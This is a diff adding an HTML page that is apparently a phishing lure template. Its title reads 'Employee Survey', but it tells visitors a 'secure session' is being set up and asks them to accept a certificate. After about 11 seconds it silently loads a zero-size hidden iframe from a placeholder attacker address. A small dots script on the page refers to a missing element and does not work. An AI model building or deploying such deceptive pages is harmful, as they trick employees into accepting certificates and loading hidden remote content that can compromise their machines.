@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Employee Survey</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+  <script src="https://use.fontawesome.com/c1be78f5b7.js"></script>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.0/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+  <!--[if lt IE 9]>
+  <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+  <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+  <![endif]-->
+</head>
+<body>
+<div class="container-fluid" style="background-color:#999999;padding:0px;min-height:775px;min-width:100%">
+  <div style="background-color:#999999;min-height:45px;padding:0px"></div>
+  <div class="container-fluid" style="padding:0px;min-height:100px">
+    <div class="col-sm-12" style="min-height:75px">
+      <div class="col-sm-3" style="padding-top:1%;padding-left:10%"><h1><i class="fa fa-shield fa-5x" aria-hidden="true"></i></h1></div>
+      <div class="col-sm-8" style="padding-top:50px">
+        <h1 style="color:white"> Setting up a secure session.<br><p></p>Please accept the certificate when prompted.</h1>
+        <p></p>
+      </div>
+    </div>
+  </div>
+
+  <div class="container-fluid" style="padding:0px;min-height:200px;background-color:#999999">
+    <div class="col-sm-12" style="min-height:75px">
+      <div class="col-sm-3" style="padding-top:1%;padding-left:10%"></div>
+      <div class="col-sm-6">
+        <h1 style="color:white" font-family="Courier New">...Please wait...</h1><i class="fa fa-spinner fa-pulse fa-4x fa-fw"></i>
+        <script>
+        var dots = window.setInterval( function() {
+          var load = document.getElementById("load");
+          if ( load.innerHTML.length > 11 )
+            load.innerHTML += "";
+          else 
+            load.innerHTML += ".";
+          }, 0950);
+        </script>
+        <iframe id="FRAME"> </iframe>
+        <script>
+        var iframe =document.getElementById('FRAME');
+          iframe.frameBorder=0;
+          iframe.style.width=0;
+          iframe.style.height=0;
+          window.setTimeout(function () {
+            iframe.setAttribute('src', 'https://web-address-here');
+            }, 11500);
+        </script>
+      </div>
+      <div class="col-sm-3"><p></p></div>
+    </div>
+  </div>
+
+</div>
+</body>
+</html>
